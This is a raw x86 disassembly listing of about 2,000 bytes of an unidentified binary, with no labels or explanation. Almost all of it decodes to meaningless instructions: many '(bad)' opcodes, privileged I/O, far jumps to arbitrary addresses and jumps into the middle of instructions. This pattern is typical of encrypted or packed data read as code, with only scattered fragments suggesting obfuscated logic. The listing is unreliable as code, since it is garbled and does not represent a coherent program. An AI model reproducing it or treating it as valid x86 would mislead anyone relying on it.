  4123eb:	outs   dx,DWORD PTR ds:[esi]
  4123ec:	shl    BYTE PTR [ebx+0x3b],cl
  4123ef:	xchg   esi,eax
  4123f0:	adc    esi,DWORD PTR [eax-0x42]
  4123f3:	cwde   
  4123f4:	inc    edx
  4123f5:	lea    edi,[edi-0x5d]
  4123f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123f9:	std    
  4123fa:	retw   
  4123fc:	std    
  4123fd:	adc    al,0x43
  4123ff:	sti    
  412400:	out    dx,al
  412401:	cmp    eax,0xe708875c
  412406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412407:	in     eax,0xc6
  412409:	imul   ebx,DWORD PTR [ebx+ebx*1-0x38],0x53980d02
  412411:	xor    eax,0x33c1d7dc
  412416:	pop    ds
  412417:	scas   al,BYTE PTR es:[edi]
  412418:	inc    edx
  412419:	cld    
  41241a:	sub    ch,BYTE PTR [edx-0x3f2a94a2]
  412420:	test   bl,0x1c
  412423:	nop
  412424:	xchg   dl,bl
  412426:	sub    ah,al
  412428:	into   
  412429:	xor    al,0x5d
  41242b:	jmp    0xbe6e:0x90b8c3c7
  412432:	imul   edi,DWORD PTR [edx-0xf],0x11eabc6
  412439:	icebp  
  41243a:	retf   0xf71d
  41243d:	xchg   ecx,eax
  41243e:	ret    0x87ad
  412441:	je     0x412472
  412443:	xchg   ecx,eax
  412444:	jns    0x41242d
  412446:	and    al,0xb4
  412448:	push   ebp
  412449:	test   DWORD PTR [ecx],esp
  41244b:	(bad)  [ebx-0x7eec2446]
  412451:	test   al,0x2a
  412453:	(bad)  
  412454:	ficomp WORD PTR [eax+0x67]
  412457:	mov    edi,0x404b754d
  41245c:	pop    ss
  41245d:	cmp    ecx,DWORD PTR [eax+0x2a]
  412460:	jns    0x41245d
  412462:	jmp    0x41244e
  412464:	sti    
  412465:	sbb    DWORD PTR [esi+0x1d],ebp
  412468:	jg     0x412403
  41246a:	jnp    0x775a57bb
  412470:	pusha  
  412471:	ins    BYTE PTR es:[edi],dx
  412472:	gs test eax,0x24e8b26
  412478:	mov    ds:0x308816b,eax
  41247d:	or     DWORD PTR [esi-0x14],eax
  412480:	inc    ebx
  412481:	inc    DWORD PTR [ecx]
  412483:	das    
  412484:	push   ss
  412485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412486:	inc    esi
  412487:	or     dh,BYTE PTR [edi]
  412489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41248a:	pop    es
  41248b:	ret    0xc792
  41248e:	dec    ebx
  41248f:	sub    eax,ecx
  412491:	push   0x7e
  412493:	test   eax,0xfab3c40a
  412498:	sbb    al,0xf7
  41249a:	sub    al,0xb7
  41249c:	jge    0x4124db
  41249e:	fisttp WORD PTR [esi+0x310fbd45]
  4124a4:	dec    ebp
  4124a5:	lods   al,BYTE PTR ds:[esi]
  4124a6:	push   eax
  4124a7:	(bad)  
  4124a8:	shr    DWORD PTR [edi],1
  4124aa:	mov    DWORD PTR [ebp-0x1c],edx
  4124ad:	jmp    0x412735
  4124b2:	iret   
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0xa91ebe60
  4124bf:	jge    0x41244c
  4124c1:	push   0x78786e3d
  4124c6:	in     eax,0x7e
  4124c8:	js     0x412542
  4124ca:	mov    ebx,0x75011c74
  4124cf:	retf   
  4124d0:	xchg   edx,eax
  4124d1:	(bad)  
  4124d2:	hlt    
  4124d3:	xor    esp,DWORD PTR [eax-0x71e60ddc]
  4124d9:	jnp    0x4124eb
  4124db:	fdivr  QWORD PTR [edx+0x1b]
  4124de:	mov    eax,ds:0x8c4dfcd6
  4124e3:	cld    
  4124e4:	shl    edi,cl
  4124e6:	out    dx,al
  4124e7:	cmp    edx,edi
  4124e9:	gs dec esp
  4124eb:	jmp    0x87fab029
  4124f0:	and    ebx,DWORD PTR [ecx+0x8]
  4124f3:	pop    edi
  4124f4:	jb     0x412494
  4124f6:	jb     0x412482
  4124f8:	sbb    al,0xe6
  4124fa:	push   ecx
  4124fb:	mov    edx,0xa0f8a141
  412500:	or     DWORD PTR [ecx],0x6b6d5ef6
  412506:	cmp    DWORD PTR [edi],edi
  412508:	dec    bl
  41250a:	clc    
  41250b:	dec    esi
  41250c:	jecxz  0x41250d
  41250e:	(bad)  
  41250f:	dec    esi
  412510:	retf   0xd2bd
  412513:	into   
  412514:	inc    edi
  412515:	pusha  
  412516:	pop    DWORD PTR [esi+ebp*1+0x2a2a3fc3]
  41251d:	sar    eax,cl
  41251f:	jge    0x41255c
  412521:	aaa    
  412522:	add    bh,BYTE PTR [ebp+0x2cf6f982]
  412528:	(bad)  
  412529:	inc    esi
  41252a:	mov    eax,0x1b2f0025
  41252f:	xor    ecx,DWORD PTR [edx+0x1ad7da92]
  412535:	outs   dx,BYTE PTR ds:[esi]
  412536:	sub    DWORD PTR [edi-0x1b75887a],esp
  41253c:	jecxz  0x4124be
  41253e:	ds pop ecx
  412540:	dec    edx
  412541:	call   0x7f8c:0x92ffe263
  412548:	push   0x1f
  41254a:	inc    ebp
  41254b:	ins    BYTE PTR es:[edi],dx
  41254c:	lods   eax,DWORD PTR ds:[esi]
  41254d:	cdq    
  41254e:	pop    eax
  41254f:	mov    al,ds:0xa9c0f9b2
  412554:	(bad)  
  412555:	ss push es
  412557:	rcr    BYTE PTR [esi],0xe7
  41255a:	nop
  41255b:	sahf   
  41255c:	push   es
  41255d:	dec    esi
  41255e:	std    
  41255f:	repz lock mov ecx,0xef4b5f80
  412566:	aaa    
  412567:	push   cs
  412568:	out    0xdd,eax
  41256a:	pop    edx
  41256b:	sub    eax,0x308e7c14
  412570:	sbb    al,al
  412572:	test   eax,0x307d7f01
  412577:	fcom   QWORD PTR [ebx]
  412579:	xchg   ecx,eax
  41257a:	add    BYTE PTR fs:[edx-0x39],0x7a
  41257f:	js     0x412520
  412581:	repz adc edx,ecx
  412584:	sbb    al,0x82
  412586:	imul   ebp,esi,0x32
  412589:	in     al,dx
  41258a:	push   esi
  41258b:	sub    esp,DWORD PTR ds:0x3456cbaf
  412591:	or     eax,0xc1d30a8a
  412596:	mov    dl,0xf3
  412598:	jno    0x4125ec
  41259a:	mov    al,0x8d
  41259c:	enter  0x6310,0x31
  4125a0:	xchg   edx,eax
  4125a1:	or     cl,cl
  4125a3:	lock mov ebp,0x74237752
  4125a9:	mov    eax,0x3259e245
  4125ae:	(bad)  
  4125af:	rcl    DWORD PTR [esi+0x3ae068c2],1
  4125b5:	mov    cs:0x563768d4,al
  4125bb:	mov    esi,0xba2f2d74
  4125c0:	call   0x69a0:0xa8f52b17
  4125c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125c8:	add    BYTE PTR [edx-0x2b],0xf7
  4125cc:	mov    eax,ds:0x33a0be43
  4125d1:	xchg   edi,eax
  4125d2:	call   FWORD PTR [esi+0x12]
  4125d5:	or     ebp,esp
  4125d7:	lods   al,BYTE PTR ds:[esi]
  4125d8:	scas   al,BYTE PTR es:[edi]
  4125d9:	ret    
  4125da:	lds    ebp,FWORD PTR [ebx+eax*2-0x7db6f65b]
  4125e1:	(bad)  
  4125e2:	push   edx
  4125e3:	lods   al,BYTE PTR ds:[esi]
  4125e4:	das    
  4125e5:	inc    edi
  4125e6:	push   cs
  4125e7:	push   ebp
  4125e8:	cld    
  4125e9:	in     al,0x4a
  4125eb:	sar    DWORD PTR [ecx-0x591a2073],0x17
  4125f2:	mov    BYTE PTR [ecx-0xb6e58fb],ah
  4125f8:	call   0x8ad33da5
  4125fd:	in     eax,dx
  4125fe:	popf   
  4125ff:	dec    esi
  412600:	dec    esp
  412601:	jge    0x41261c
  412603:	out    0x10,al
  412605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412606:	add    BYTE PTR [esi+edi*1],0x9b
  41260a:	and    eax,0xb7ef41d8
  41260f:	fsubr  DWORD PTR [edx+0x53cb9c5f]
  412615:	xchg   ebx,eax
  412616:	pop    es
  412617:	dec    ebp
  412618:	pop    ds
  412619:	inc    ecx
  41261a:	mov    ebp,0xaac78df1
  41261f:	push   0xb4174093
  412624:	mov    ch,0xc3
  412626:	push   ebx
  412627:	aas    
  412628:	ds sbb ebx,esp
  41262b:	inc    ebp
  41262c:	lock (bad) 
  41262e:	push   ecx
  41262f:	pop    ebx
  412630:	mov    DWORD PTR [edx+edi*8],edi
  412633:	mov    dl,0xa0
  412635:	dec    eax
  412636:	or     eax,0x39dea7b3
  41263b:	test   al,0xfd
  41263d:	cli    
  41263e:	add    esi,DWORD PTR [edi-0x6e]
  412641:	push   0xe
  412643:	xlat   BYTE PTR ds:[ebx]
  412644:	(bad)
  412648:	fisttp QWORD PTR [ebp+0x6a]
  41264b:	or     dh,BYTE PTR [ecx+0x245309f3]
  412651:	clc    
  412652:	pop    ss
  412653:	loopne 0x412637
  412655:	cmp    eax,esp
  412657:	dec    eax
  412658:	jmp    0x967b67f2
  41265d:	push   eax
  41265e:	mul    DWORD PTR [ebx+0x2b8dfd36]
  412664:	mov    ebp,0x1e4deb5e
  412669:	mov    cl,0xb0
  41266b:	pop    esi
  41266c:	out    dx,al
  41266d:	dec    edi
  41266e:	sub    DWORD PTR [esi+0x52],0x895fbd43
  412675:	fnstenv [ebx]
  412677:	daa    
  412678:	mov    ecx,0x90ae302a
  41267d:	iret   
  41267e:	mov    edx,0x5d3450bd
  412683:	mov    esp,0x6f0a8d57
  412688:	dec    eax
  412689:	jge    0x41263f
  41268b:	stc    
  41268c:	fs out dx,eax
  41268e:	lock popa 
  412690:	aad    0xc0
  412692:	mov    ds:0xc4da105d,al
  412697:	or     edx,DWORD PTR [eax+0x4f]
  41269a:	retf   0xe357
  41269d:	fs cdq 
  41269f:	cmp    DWORD PTR [ebx],0x18dbd0eb
  4126a5:	mov    ch,0xfe
  4126a7:	(bad)  
  4126a8:	repnz adc eax,0xbbd42e14
  4126ae:	popa   
  4126af:	cdq    
  4126b0:	jl     0x4126d9
  4126b2:	xchg   esp,eax
  4126b3:	pop    esp
  4126b4:	shl    BYTE PTR [ebx+edi*8-0x85a6723],1
  4126bb:	jo     0x4126e5
  4126bd:	sti    
  4126be:	les    ebp,FWORD PTR [ecx-0x18]
  4126c1:	inc    ebx
  4126c2:	(bad)  
  4126c3:	int3   
  4126c4:	cmp    esp,0xfae75cee
  4126ca:	jbe    0x4126ec
  4126cc:	fnstsw WORD PTR [ebp+0x1a5e911a]
  4126d2:	js     0x412712
  4126d4:	jmp    0x4e62f59a
  4126d9:	test   eax,eax
  4126db:	dec    esi
  4126dc:	out    0x1,al
  4126de:	aaa    
  4126df:	or     esp,edx
  4126e1:	shl    BYTE PTR [ebp-0x7d],cl
  4126e4:	shl    DWORD PTR [esp+eax*2+0x43],0xba
  4126e9:	pop    esi
  4126ea:	fsubp  st(4),st
  4126ec:	lea    eax,[edx-0x7b]
  4126ef:	icebp  
  4126f0:	cmp    al,0xce
  4126f2:	les    eax,FWORD PTR [esi]
  4126f4:	sahf   
  4126f5:	fwait
  4126f6:	mov    bl,0x78
  4126f8:	mov    bh,0x8
  4126fa:	ds in  eax,dx
  4126fc:	jge    0x412727
  4126fe:	stc    
  4126ff:	mov    WORD PTR [ebx],ds
  412701:	or     edx,esp
  412703:	pop    esi
  412704:	jae    0x41275f
  412706:	adc    edi,DWORD PTR [edx-0x4e696fd1]
  41270c:	out    0x57,al
  41270e:	push   0xb9b5c545
  412713:	jmp    0x4126f5
  412715:	scas   al,BYTE PTR es:[edi]
  412716:	fistp  WORD PTR [edx]
  412718:	sbb    al,0xb9
  41271a:	pop    ss
  41271b:	fsubrp st(0),st
  41271d:	cmp    DWORD PTR [ebp+0x3f],esp
  412720:	out    dx,al
  412721:	stc    
  412722:	lea    ebp,[eax-0x4e37577e]
  412728:	cmp    BYTE PTR [eax+0x15f91a3a],al
  41272e:	dec    esi
  41272f:	jle    0x41276b
  412731:	inc    ecx
  412732:	mov    bh,0x2e
  412734:	out    dx,al
  412735:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  41273c:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	adc    al,0x3
  412756:	inc    edx
  412757:	and    eax,0x78786caa
  41275c:	in     eax,0x7e
  41275e:	js     0x4127d8
  412760:	mul    BYTE PTR [ebx+0x74]
  412763:	mov    BYTE PTR [edx],0x29
  412766:	(bad)  
  412767:	jle    0x412784
  412769:	shl    BYTE PTR [ecx-0x7c],cl
  41276c:	lods   eax,DWORD PTR ds:[esi]
  41276d:	or     BYTE PTR [ecx+0x66],bl
  412770:	mov    edi,0x90efdb06
  412775:	fist   DWORD PTR [ecx-0x6f]
  412778:	iret   
  412779:	ret    
  41277a:	xchg   ebx,eax
  41277b:	(bad)  
  41277d:	enter  0x8bff,0xbf
  412781:	sbb    al,0x8
  412783:	into   
  412784:	mov    eax,0x626b014b
  412789:	jmp    0xb124:0xb1a52e60
  412790:	retf   0xc4f4
  412793:	repz int3 
  412795:	loopne 0x4127d4
  412797:	adc    al,0xf
  412799:	div    BYTE PTR es:[esi+0x1]
  41279d:	xchg   ebp,ebx
  41279f:	cmp    ebx,edi
  4127a1:	jp     0x4127e8
  4127a3:	pop    ds
  4127a4:	and    DWORD PTR [edx-0x29],ecx
  4127a7:	iret   
  4127a8:	mov    dh,0xef
  4127aa:	mov    bl,0x35
  4127ac:	jl     0x412749
  4127ae:	jle    0x412739
  4127b0:	outs   dx,DWORD PTR ds:[esi]
  4127b1:	or     bl,ah
  4127b3:	popa   
  4127b4:	js     0x412739
  4127b6:	jge    0x4127b8
  4127b8:	cmp    BYTE PTR [ebp-0xc],0x66
  4127bc:	lods   eax,DWORD PTR ds:[esi]
  4127bd:	pop    ebx
  4127be:	adc    bl,BYTE PTR [edi]
  4127c0:	test   BYTE PTR [ebx],al
  4127c2:	push   ebp
  4127c3:	push   eax
  4127c4:	dec    ebx
  4127c5:	(bad)  
  4127c6:	jecxz  0x4127ab
  4127c8:	or     DWORD PTR [ebx-0xf225ab9],esi
  4127ce:	stos   BYTE PTR es:[edi],al
  4127cf:	xor    eax,0x84e567e3
  4127d4:	test   ecx,esp
  4127d6:	mov    esi,0x29bce900
  4127db:	adc    BYTE PTR ss:[eax+ebx*4-0xa],ah
  4127e0:	lahf   
  4127e1:	clc    
  4127e2:	hlt    
  4127e3:	mov    ecx,0xd161aa4a
  4127e8:	xchg   esi,eax
  4127e9:	lahf   
  4127ea:	push   esp
  4127eb:	into   
  4127ec:	xchg   esp,eax
  4127ed:	std    
  4127ee:	cdq    
  4127ef:	and    eax,0x94e70def
  4127f4:	imul   DWORD PTR [eax-0x689f9f94]
  4127fa:	xchg   edx,eax
  4127fb:	mov    al,ds:0x97bbafae
  412800:	add    ah,BYTE PTR [edx+0x4c]
  412803:	lea    ecx,[edi]
  412805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412806:	pop    ecx
  412807:	shl    bl,cl
  412809:	cmp    DWORD PTR [esi+eiz*4+0x3c83df2d],ebx
  412810:	pop    edi
  412811:	es jo  0x41279a
  412814:	aam    0x6c
  412816:	sub    al,0x9f
  412818:	in     eax,dx
  412819:	bound  eax,QWORD PTR [ebx-0x3adbec34]
  41281f:	fs jnp 0x412850
  412822:	mov    edx,0x38b47720
  412827:	pop    edx
  412828:	or     BYTE PTR [edi-0xd333306],cl
  41282e:	hlt    
  41282f:	and    eax,0x6bfbaac5
  412834:	mov    bh,0xa6
  412836:	push   ecx
  412837:	(bad)  
  412838:	ins    DWORD PTR es:[edi],dx
  412839:	dec    esp
  41283a:	jle    0x412847
  41283c:	loopne 0x4127d8
  41283e:	cmp    edx,DWORD PTR [edi-0x667ab1ef]
  412844:	cmp    dh,BYTE PTR [ebx+0x542d7305]
  41284a:	pop    ds
  41284b:	gs mov ebx,0xca16c1ce
  412851:	enter  0xf906,0xc1
  412855:	add    al,0x8a
  412857:	call   0x252c:0xc830788f
  41285e:	pop    ecx
  41285f:	outs   dx,BYTE PTR ds:[esi]
  412860:	retf   
  412861:	xchg   bh,dh
  412863:	push   es
  412864:	mov    ebx,DWORD PTR [edi]
  412866:	pusha  
  412867:	aaa    
  412868:	push   esp
  412869:	dec    esp
  41286a:	cld    
  41286b:	and    eax,0x3d40643c
  412870:	ins    DWORD PTR es:[edi],dx
  412871:	sbb    DWORD PTR [edx],ecx
  412873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412874:	fs push cs
  412876:	add    esi,edi
  412878:	mov    ds:0x22913086,al
  41287d:	dec    ebx
  41287e:	push   ecx
  41287f:	dec    edx
  412880:	mov    edx,0x9dcd2679
  412885:	xchg   edx,eax
  412886:	mov    al,ds:0xf8f84579
  41288b:	arpl   WORD PTR [eax],di
  41288d:	mov    al,BYTE PTR [edi+0x60]
  412890:	in     eax,dx
  412891:	sti    
  412892:	pop    ebp
  412893:	inc    ecx
  412894:	int3   
  412895:	imul   eax,DWORD PTR [ebp-0x462c264d],0xffffffc1
  41289c:	aad    0xc8
  41289e:	out    0x13,al
  4128a0:	cdq    
  4128a1:	retf   
  4128a2:	clc    
  4128a3:	push   ss
  4128a4:	mov    BYTE PTR [edx],bl
  4128a6:	mov    bh,0xef
  4128a8:	jmp    0x32d66566
  4128ad:	mov    eax,esp
  4128af:	repz das 
  4128b1:	add    al,BYTE PTR [esi]
  4128b3:	jno    0x4128b0
  4128b5:	mov    ebx,0x47da7d2b
  4128ba:	bound  edi,QWORD PTR [ecx+0x61c391de]
  4128c0:	arpl   WORD PTR [esi+0x57658],bx
  4128c6:	jp     0x412852
  4128c8:	call   0xa181:0x57afaf3f
  4128cf:	push   esp
  4128d0:	mov    al,0x30
  4128d2:	into   
  4128d3:	ins    BYTE PTR es:[edi],dx
  4128d4:	repnz inc edi
  4128d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128d7:	popf   
  4128d8:	adc    DWORD PTR [ebx-0x77c9ff32],ebp
  4128de:	inc    ebp
  4128df:	nop
  4128e0:	inc    edi
  4128e1:	out    0x97,eax
  4128e3:	sub    ch,dl
  4128e5:	xlat   BYTE PTR ds:[ebx]
  4128e6:	sbb    bl,bh
  4128e8:	inc    ebp
  4128e9:	test   BYTE PTR [ebx+0x2c3f8186],0x37
  4128f0:	jb     0x412921
  4128f2:	mov    ebp,0x190002e
  4128f7:	in     eax,dx
  4128f8:	adc    al,0x4c
  4128fa:	mov    ah,0xc
  4128fc:	retf   0xaab8
  4128ff:	dec    ecx
  412900:	popf   
  412901:	mov    eax,0xd60d23e1
  412906:	pop    eax
  412907:	dec    DWORD PTR [edx+0x51]
  41290a:	aam    0x7e
  41290c:	ror    BYTE PTR [eax],0x96
  41290f:	lock add ebx,esp
  412912:	mov    ah,0x8b
  412914:	mov    ah,BYTE PTR fs:[edx+0x57267543]
  41291b:	xchg   BYTE PTR [ecx-0x4c],bh
  41291e:	rcl    DWORD PTR [edi-0x68],0xe5
  412922:	bound  esi,QWORD PTR [esi]
  412924:	ficomp WORD PTR [edi-0x7e84748b]
  41292a:	pop    eax
  41292b:	pop    esp
  41292c:	fst    QWORD PTR [edi]
  41292e:	js     0x4128d2
  412930:	dec    ebp
  412931:	out    0x93,al
  412933:	sbb    al,0x9c
  412935:	sub    DWORD PTR [edi-0x6b],ebx
  412938:	jecxz  0x412992
  41293a:	push   0xffffffc4
  41293c:	mov    dh,0x7b
  41293e:	mov    ds:0x77716020,al
  412943:	add    al,0x86
  412945:	fsubrp st(7),st
  412947:	and    al,bh
  412949:	jno    0x4128ea
  41294b:	iret   
  41294c:	test   bh,ah
  41294e:	imul   edi,esp,0x4a2eae9
  412954:	push   edx
  412955:	pop    es
  412956:	cld    
  412957:	sbb    esp,DWORD PTR [edx-0x1c]
  41295a:	aam    0xbb
  41295c:	out    0xde,al
  41295e:	push   edx
  41295f:	pop    esp
  412960:	xchg   DWORD PTR [edi+0x41],ebx
  412963:	in     eax,0x5
  412965:	test   al,0xcc
  412967:	icebp  
  412968:	mov    esi,0x16060ada
  41296d:	xor    DWORD PTR [edi-0x6],0x6875b2e6
  412974:	jl     0x4129ae
  412976:	hlt    
  412977:	push   ebp
  412978:	and    BYTE PTR [esi-0x740f031e],al
  41297e:	xchg   ebx,eax
  41297f:	adc    ebx,0xffffffb7
  412982:	mov    ch,cl
  412984:	mov    dh,0x63
  412986:	inc    DWORD PTR es:[edi-0x4cc55877]
  41298d:	rol    BYTE PTR [edi],1
  41298f:	push   ss
  412990:	(bad)  
  412991:	xor    al,BYTE PTR [edx]
  412993:	dec    edx
  412994:	lods   al,BYTE PTR ds:[esi]
  412995:	mov    ecx,0x9690b243
  41299a:	loopne 0x41296a
  41299c:	push   ss
  41299d:	xor    DWORD PTR [ebp+0x5764189f],edi
  4129a3:	jmp    0x412937
  4129a5:	pop    esp
  4129a6:	cmp    BYTE PTR [edx-0x2],0xdc
  4129aa:	in     eax,dx
  4129ab:	retf   
  4129ac:	mov    ?,WORD PTR [edi+ebx*2-0x76]
  4129b0:	sbb    bh,BYTE PTR [ebx-0x68]
  4129b3:	adc    ecx,DWORD PTR [ebp-0x79699aa3]
  4129b9:	outs   dx,BYTE PTR ds:[esi]
  4129ba:	cmp    BYTE PTR [esi],ch
  4129bc:	push   ecx
  4129bd:	xor    eax,0x109aa64b
  4129c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129c3:	inc    ebx
  4129c4:	xor    edx,ebp
  4129c6:	adc    DWORD PTR [esi+0x72],ecx
  4129c9:	rcl    BYTE PTR [ebp+0x33e8558b],cl
  4129cf:	rol    BYTE PTR [ebx],1
  4129d1:	shr    ecx,1
  4129d3:	cwde   
  4129d4:	sldt   WORD PTR [eax]
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x412a22
  4129f1:	bound  eax,QWORD PTR [edx+0x7871179a]
  4129f7:	js     0x4129de
  4129f9:	jle    0x412a73
  4129fb:	js     0x412a07
  4129fd:	fsubr  QWORD PTR [edx-0x4b]
  412a00:	icebp  
  412a01:	lods   al,BYTE PTR ds:[esi]
  412a02:	rcr    DWORD PTR [edx],0x8f
  412a05:	leave  
  412a06:	xor    edx,DWORD PTR [ecx+eiz*1-0x277595e5]
  412a0d:	mov    cl,0x42
  412a0f:	pushf  
  412a10:	rol    BYTE PTR [edi+ebp*4+0x3f],1
  412a14:	lods   eax,DWORD PTR ds:[esi]
  412a15:	xor    DWORD PTR [eax],ecx
  412a17:	xchg   ebp,eax
  412a18:	sbb    DWORD PTR [esi],0xffffff99
  412a1b:	aad    0xd3
  412a1d:	pop    ebp
  412a1e:	sbb    al,0x35
  412a20:	das    
  412a21:	inc    esp
  412a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a23:	jge    0x412a68
  412a25:	mov    al,0x13
  412a27:	mov    bl,0x3
  412a29:	jns    0x412a12
  412a2b:	sbb    edi,edx
  412a2d:	popa   
  412a2e:	test   eax,0x62248181
  412a33:	call   0xc77f:0x1cb106ab
  412a3a:	scas   eax,DWORD PTR es:[edi]
  412a3b:	dec    ebp
  412a3c:	jl     0x412a62
  412a3e:	mov    edx,es
  412a40:	mov    edx,0x4229f94a
  412a45:	dec    ecx
  412a46:	and    eax,0x140d20c5
  412a4b:	xor    DWORD PTR [eax-0x47],ebp
  412a4e:	pop    edi
  412a4f:	test   BYTE PTR [edx+ebp*2+0x748eea8f],bl
  412a56:	dec    eax
  412a57:	mov    ebp,0x77ba21f9
  412a5c:	fldcw  WORD PTR [ecx]
  412a5e:	push   ds
  412a5f:	add    BYTE PTR [edx+0x54],al
  412a62:	sti    
  412a63:	mov    eax,ds:0xf0a3dff3
  412a68:	add    DWORD PTR [ecx+ebp*1],ebx
  412a6b:	loop   0x412ab3
  412a6d:	enter  0x2c5,0xda
  412a71:	push   ebp
  412a72:	sub    dl,0x4f
  412a75:	inc    esi
  412a76:	and    ebx,DWORD PTR [edx-0xf]
  412a79:	and    BYTE PTR [esi-0x7b],ch
  412a7c:	pop    ecx
  412a7d:	mov    ds:0xf46742dc,al
  412a82:	(bad)  
  412a83:	fimul  DWORD PTR [eax-0x14a96c59]
  412a89:	jbe    0x412ab6
  412a8b:	leave  
  412a8c:	bound  ebp,QWORD PTR [esi]
  412a8e:	xor    DWORD PTR [ecx],ebp
  412a90:	out    dx,eax
  412a91:	(bad)  
  412a92:	xchg   esp,eax
  412a93:	mov    cl,0x92
  412a95:	push   0x73
  412a97:	jmp    0x412a70
  412a99:	shl    BYTE PTR [ecx-0x1b7e24c6],cl
  412a9f:	mov    ecx,0xe0cd7b60
  412aa4:	call   0xa085:0x4908ab8f
  412aab:	or     esp,DWORD PTR [esi+0x57919e4c]
  412ab1:	inc    ebx
  412ab2:	jno    0x412aab
  412ab4:	jnp    0x412a59
  412ab6:	jl     0x412a3c
  412ab8:	fsub   DWORD PTR [ecx+0x3b]
  412abb:	jg     0x412a8e
  412abd:	add    bl,BYTE PTR [ebx+0x54]
  412ac0:	icebp  
  412ac1:	in     al,0xb
  412ac3:	int3   
  412ac4:	test   eax,0xe88928f2
  412ac9:	mov    dh,0x25
  412acb:	mov    ch,0x58
  412acd:	mov    cl,0x11
  412acf:	mov    eax,ds:0x7b647c78
  412ad4:	sub    al,dl
  412ad6:	xchg   ebp,eax
  412ad7:	push   ebp
  412ad8:	cmp    al,0xc2
  412ada:	cmp    DWORD PTR [esi],ebp
  412adc:	jae    0x412ae5
  412ade:	repz aad 0xf4
  412ae1:	in     al,0x5f
  412ae3:	add    DWORD PTR [eax+0x6c],esp
  412ae6:	test   BYTE PTR ds:[eax],ch
  412ae9:	push   ebx
  412aea:	ds mov esp,0xe2237b7a
  412af0:	mov    dl,BYTE PTR [eax+ebx*4+0x1f]
  412af4:	ret    0x2e53
  412af7:	xor    dh,BYTE PTR [esi-0x59]
  412afa:	popf   
  412afb:	call   0xe10e:0x4cf70ae5
  412b02:	mov    al,ds:0x29833165
  412b07:	gs sub eax,0xa78b3bff
  412b0d:	cli    
  412b0e:	clc    
  412b0f:	pop    edi
  412b10:	xor    eax,0xbe6e4085
  412b15:	pop    esi
  412b16:	mov    DWORD PTR [eax-0x40951e1f],esi
  412b1c:	daa    
  412b1d:	or     esp,0x9c72c78a
  412b23:	and    eax,0x24348e21
  412b28:	push   ds
  412b29:	xor    BYTE PTR [edi],ch
  412b2b:	mov    dh,0xf7
  412b2d:	shr    BYTE PTR [edx-0x5b533a2f],cl
  412b33:	cmp    esi,DWORD PTR ds:0xd226dabb
  412b39:	pop    eax
  412b3a:	pop    eax
  412b3b:	or     al,0x27
  412b3d:	repz jae 0x412bab
  412b40:	push   ebx
  412b41:	xchg   BYTE PTR [eax-0x2d43c89d],al
  412b47:	jns    0x412ae4
  412b49:	shl    BYTE PTR [edx+0x72],cl
  412b4c:	adc    DWORD PTR [edi+0x54],0xffffffb0
  412b50:	leave  
  412b51:	not    DWORD PTR [esi-0x56]
  412b54:	ins    DWORD PTR es:[edi],dx
  412b55:	imul   esi,DWORD PTR [ebx+0x5e],0xfffffff3
  412b59:	pop    ebp
  412b5a:	mov    edx,edi
  412b5c:	adc    ebx,DWORD PTR [si+0x47]
  412b60:	sti    
  412b61:	inc    esp
  412b62:	and    BYTE PTR [ecx-0x6e],ch
  412b65:	int3   
  412b66:	std    
  412b67:	retf   
  412b68:	mov    edi,DWORD PTR [edx]
  412b6a:	aam    0xcc
  412b6c:	aam    0x79
  412b6e:	pop    es
  412b6f:	cmp    bh,bl
  412b71:	add    ch,BYTE PTR [ebp-0x2f2d6088]
  412b77:	cmc    
  412b78:	sub    edx,DWORD PTR [eax]
  412b7a:	push   edx
  412b7b:	lods   eax,DWORD PTR ds:[esi]
  412b7c:	cdq    
  412b7d:	sub    BYTE PTR [esi+0xc2f26a8],bh
  412b83:	inc    ecx
  412b84:	cdq    
  412b85:	lods   al,BYTE PTR ds:[esi]
  412b86:	je     0x412b1f
  412b88:	add    edx,DWORD PTR [ecx]
  412b8a:	push   ss
  412b8b:	pop    edx
  412b8c:	(bad)  
  412b90:	ja     0x412ba1
  412b92:	aas    
  412b93:	hlt    
  412b94:	ins    BYTE PTR es:[edi],dx
  412b95:	mov    al,0xb6
  412b97:	pop    edx
  412b98:	icebp  
  412b99:	cmp    DWORD PTR [edi+esi*8],ecx
  412b9c:	xor    ah,BYTE PTR [ebp+0x52f1fec3]
  412ba2:	sahf   
  412ba3:	dec    edx
  412ba4:	aam    0x15
  412ba6:	add    BYTE PTR [eax-0x4d48ee0a],cl
  412bac:	pop    es
  412bad:	jo     0x412b86
  412baf:	nop
  412bb0:	xlat   BYTE PTR ds:[ebx]
  412bb1:	ret    0x9dd7
  412bb4:	dec    esi
  412bb5:	loopne 0x412bbd
  412bb7:	std    
  412bb8:	push   edx
  412bb9:	mov    esp,0x771b7db6
  412bbe:	mov    al,al
  412bc0:	into   
  412bc1:	mov    al,ds:0x669be104
  412bc6:	pushf  
  412bc7:	adc    eax,0x714810ac
  412bcc:	mov    al,ds:0x68b3d61e
  412bd1:	out    0x48,eax
  412bd3:	in     al,0x48
  412bd5:	adc    BYTE PTR [edx-0xc],ch
  412bd8:	(bad)  
  412bd9:	out    dx,al
  412bda:	pop    es
